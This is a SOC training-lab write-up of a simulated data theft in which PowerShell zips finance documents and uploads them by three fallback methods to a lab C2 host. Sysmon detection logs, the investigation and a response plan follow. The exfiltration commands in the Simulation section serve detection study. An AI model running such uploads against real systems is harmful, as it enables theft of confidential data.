# AGC-062 — Large HTTPS Upload (Data Theft)

> **Disclosure:** Executed & documented by Claude Code under direction and review by Hasan.

## Card

| Field | Value |
|---|---|
| ID | `AGC-062` |
| Category | `10-exfiltration` — Exfiltration |
| MITRE Technique | `T1041` Exfiltration Over C2 Channel |
| Verdict | True Positive |
| Confidence | Critical |
| Time to Detect | Sysmon EID 3 (outbound connections to known C2 IP) + network flow byte volume analysis |
| Time to Triage | 05:00 (correlate upload volume with staged archive size, cross-reference C2 beacon history) |
| Affected Systems | `COMPROMISED-HOST-01` / `COMPROMISED-01` (10.10.10.103) exfiltrating to `EXT-ATTACKER-SIM` (10.10.40.10) |
| Chain | ◀ [AGC-061](../../09-collection/AGC-061-ad-export-collection/README.md) (Collection category) · next [AGC-063](../AGC-063-dns-tunneling/README.md) ▶ |
| One-line Summary | 3 outbound connections from powershell.exe (PID 4336) to 10.10.40.10 on ports 443 and 80, uploading a staged.zip archive (1,331 bytes) containing 8 finance documents via POST and WebClient methods. Same ProcessGuid across all connections confirms single exfiltration operation. WebClient upload succeeded (HTTP 200 with redirect). Closes the loop from C2 beacon (AGC-051/055/056) through collection (AGC-057) to confirmed data theft. FP twin: AGC-086 (regulatory submission). |

## Attacker Perspective

### Tradecraft

**What:** Upload of the collected archive over the C2 channel that was already open. The attacker:
1. Established C2 connectivity (AGC-051/055/056)
2. Collected and archived sensitive documents (AGC-057)
3. Uploads the archive to the attacker-controlled server

**Why an Attacker Uses It Here:**
- HTTPS hides the payload from any network inspection that lacks TLS interception
- Reusing the C2 host at 10.10.40.10 means no new destination appears in the flow logs
- POST method with `-InFile` sends the archive in a single request
- Falling back from Invoke-WebRequest to WebClient means one parsing failure does not stop the upload
- At Ashford Grove Capital the stolen data (revenue reports, client PII, wire transfer logs, M&A documents) triggers mandatory breach notification

### Simulation

**Pre-conditions:**
- `COMPROMISED-HOST-01` running, Administrator context
- `EXT-ATTACKER-SIM` running at 10.10.40.10 (C2 server with HTTP/HTTPS listeners)
- staged.zip created containing 8 representative finance documents (1,331 bytes)

**Execution:**
```powershell
# Create staged archive with finance documents
Compress-Archive -Path "C:\Windows\Temp\agc062_exfil\*" -DestinationPath "C:\Windows\Temp\staged.zip"

# Method 1: HTTPS POST upload
Invoke-WebRequest -Uri "https://10.10.40.10/upload" -Method Post -InFile "C:\Windows\Temp\staged.zip"

# Method 2: HTTP POST upload (fallback)
Invoke-WebRequest -Uri "http://10.10.40.10/upload" -Method Post -InFile "C:\Windows\Temp\staged.zip"

# Method 3: .NET WebClient upload
$wc = New-Object System.Net.WebClient
$wc.UploadFile("https://10.10.40.10:443/exfil", "C:\Windows\Temp\staged.zip")
```

**Result:**
- Method 1 (HTTPS POST): Connection established on port 443, IE parsing error (UseBasicParsing not specified) but TCP connection completed
- Method 2 (HTTP POST): Connection established on port 80, same IE parsing error
- Method 3 (WebClient HTTPS): Upload succeeded — HTTP 200 response received with HTML redirect body
- Sysmon EID 3 captured all 3 connections under the same ProcessGuid

## SOC Perspective

### Detection

**Sysmon EID 3 — Network Connection #1 (HTTPS POST, port 443):**
```
Network connection detected:
UtcTime: 2026-09-15 22:44:48.669
ProcessGuid: {eb65e329-ca5e-6aa9-ad04-000000001400}
ProcessId: 4336
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: COMPROMISED-01\Administrator
Protocol: tcp
Initiated: true
SourceIp: 10.10.10.103
SourcePort: 64860
DestinationIp: 10.10.40.10
DestinationPort: 443
DestinationPortName: https
```

**Sysmon EID 3 — Network Connection #2 (HTTP POST, port 80):**
```
Network connection detected:
UtcTime: 2026-09-15 22:44:51.155
ProcessGuid: {eb65e329-ca5e-6aa9-ad04-000000001400}
ProcessId: 4336
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
SourceIp: 10.10.10.103
SourcePort: 64861
DestinationIp: 10.10.40.10
DestinationPort: 80
DestinationPortName: http
```

**Sysmon EID 3 — Network Connection #3 (WebClient HTTPS, port 443):**
```
Network connection detected:
UtcTime: 2026-09-15 22:44:53.182
ProcessGuid: {eb65e329-ca5e-6aa9-ad04-000000001400}
ProcessId: 4336
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
SourceIp: 10.10.10.103
SourcePort: 64862
DestinationIp: 10.10.40.10
DestinationPort: 443
DestinationPortName: https
```

**Sysmon EID 1 — Process Create (PowerShell execution):**
```
Process Create:
UtcTime: 2026-09-15 22:44:46.723
ProcessGuid: {eb65e329-ca5e-6aa9-ad04-000000001400}
ProcessId: 4336
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -File C:\Temp\agc062-sim.ps1
User: COMPROMISED-01\Administrator
```

### Investigation

**Step 1 — ProcessGuid correlation across all 3 connections:**
All 3 EID 3 events share ProcessGuid `{eb65e329-ca5e-6aa9-ad04-000000001400}`, the same GUID Sysmon EID 1 logged for powershell.exe (PID 4336). One PowerShell process made all 3 upload attempts; this is one operation, not three incidents.

**Step 2 — Connection timing analysis:**
```
22:44:48.669  HTTPS POST to :443 (port 64860)
22:44:51.155  HTTP POST  to :80  (port 64861)  -- 2.5s later
22:44:53.182  HTTPS WebClient to :443 (port 64862)  -- 2.0s later
```
Three connections within 5 seconds to one external IP, on consecutive source ports, is a script with fallback methods, not a person typing. The port 80 attempt sits between the two HTTPS attempts, so the script dropped to HTTP when the first HTTPS request failed.

**Step 3 — Correlation with C2 beacon history (AGC-051/055/056):**
10.10.40.10 is the C2 server from AGC-051 (DNS beacon), AGC-055 (PowerShell outbound), and AGC-056 (C2 process tree). The uploads ride the same channel:
- Beacon establishment (AGC-051): DNS queries to attacker-controlled server
- C2 communication (AGC-055/056): PowerShell HTTPS beacons to 10.10.40.10
- Data collection (AGC-057): Finance documents archived to staged.zip
- **Data exfiltration (AGC-062): staged.zip uploaded to 10.10.40.10**

**Step 4 — Volume anomaly assessment:**
Sysmon EID 3 does not record bytes transferred. Still, 3 rapid POST connections from PowerShell with `-InFile` (file upload) look nothing like the small periodic callbacks of beacon traffic. Network flow logs (conn.log) or firewall logs would show orig_bytes spike during this window.

**Step 5 — FP twin exclusion (AGC-086):**
AGC-086 is the benign twin: a large HTTPS upload, but to an authorized regulatory portal. What separates this case:
- This upload targets 10.10.40.10 (known C2, not a regulatory endpoint)
- No filing window or business justification exists for the upload
- The upload follows the unauthorized collection activity (AGC-057-061)
- Regulatory submission ruled out

### Report

**Verdict: True Positive** — Confirmed data exfiltration over established C2 channel.

**Confidence: Critical** — supported by:
1. **Confirmed exfiltration** — WebClient upload succeeded (HTTP 200), data reached the attacker's server
2. **ProcessGuid chain** ties the upload process to the C2 beacon infrastructure
3. **3 upload attempts** (HTTPS, HTTP, WebClient HTTPS) show the script kept trying until one method worked
4. **Full attack chain closed**: C2 establishment -> collection -> staging -> exfiltration
5. **Financial data** — at Ashford Grove Capital, this triggers mandatory breach notification requirements

**This is a confirmed data breach for regulatory reporting purposes.**

**Response recommendation:**
1. **IMMEDIATELY block 10.10.40.10** at the perimeter firewall (OPNsense) — all protocols, all ports
2. **Isolate COMPROMISED-HOST-01** from the network — the C2 channel is live and one upload already succeeded
3. **Determine breach scope** — compare the staged.zip contents with the AGC-057 bulk archive to list exactly which documents left
4. **Initiate breach notification process** — client PII, financial records, and M&A documents all carry regulatory disclosure deadlines
5. **Preserve forensic evidence** — snapshot COMPROMISED-HOST-01 before remediation; preserve Sysmon logs, network flow logs, and firewall logs
6. **Hunt for additional exfiltration** — search for other large outbound connections to 10.10.40.10 across every other endpoint in the lab

### MITRE Mapping

| Tactic | Technique ID | Technique Name | Evidence | Confidence |
|---|---|---|---|---|
| Exfiltration (TA0010) | T1041 | Exfiltration Over C2 Channel | 3 EID 3 events: powershell.exe (PID 4336) -> 10.10.40.10 on ports 443/80. POST + WebClient upload of staged.zip (1,331 B). WebClient succeeded (HTTP 200). Same ProcessGuid as C2 beacon. | Critical |

## Evidence

Screenshots: none in phase one (text evidence only); added when this scenario is re-executed by hand in phase two.

### Exfiltration connection timeline

```
Time (UTC)          Method          Port   Source Port  Result
22:44:48.669        HTTPS POST      443    64860        IE parse error (TCP completed)
22:44:51.155        HTTP POST       80     64861        IE parse error (TCP completed)
22:44:53.182        WebClient HTTPS 443    64862        SUCCESS (HTTP 200)

All connections:
  ProcessGuid: {eb65e329-ca5e-6aa9-ad04-000000001400}
  PID: 4336 (powershell.exe)
  Source: 10.10.10.103 (COMPROMISED-HOST-01)
  Destination: 10.10.40.10 (EXT-ATTACKER-SIM / C2 server)
  Payload: staged.zip (1,331 bytes, 8 finance documents)
```

### Full attack chain closure

```
Phase           Scenario   Action                              Evidence
C2 Establish    AGC-051    DNS beacon to 10.10.40.10           EID 22 DNS queries
C2 Communicate  AGC-055    PowerShell HTTPS beacons            EID 3 to 10.10.40.10:443
C2 Process Tree AGC-056    mshta->PS->beacon chain             ProcessGuid chain
Collection      AGC-057    Finance docs -> staged.zip          EID 1 Compress-Archive
Exfiltration    AGC-062    staged.zip POST to 10.10.40.10      EID 3 (3 connections, 1 success)

STATUS: CONFIRMED DATA BREACH
Regulatory notification required for financial services firm.
```
